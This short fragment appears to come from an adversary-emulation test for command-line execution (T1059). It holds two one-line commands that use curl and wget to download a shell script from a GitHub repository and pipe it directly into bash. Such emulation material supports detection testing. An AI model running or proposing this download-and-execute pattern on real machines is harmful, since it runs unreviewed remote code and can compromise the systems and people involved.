...
```
bash -c "curl -sS https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1059/echo-art-fish.sh | bash"
bash -c "wget --quiet -O - https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/Atomics/T1059/echo-art-fish.sh | bash"
```
